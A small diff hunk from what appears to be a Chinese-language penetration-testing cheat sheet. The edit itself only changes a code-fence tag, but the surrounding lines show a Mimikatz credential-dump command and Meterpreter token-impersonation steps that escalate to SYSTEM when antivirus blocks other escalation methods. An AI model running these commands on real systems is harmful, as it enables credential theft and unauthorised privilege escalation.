@@ -153,7 +153,7 @@ kiwi_cmd sekurlsa::logonPasswords
 ```
 
 遇到杀软，无法甜土豆提权，可msf获得会话后假冒令牌提权
-```css
+```cs
 load incognito
 list_tokens -u
 impersonate_token "NT AUTHORITY\SYSTEM"
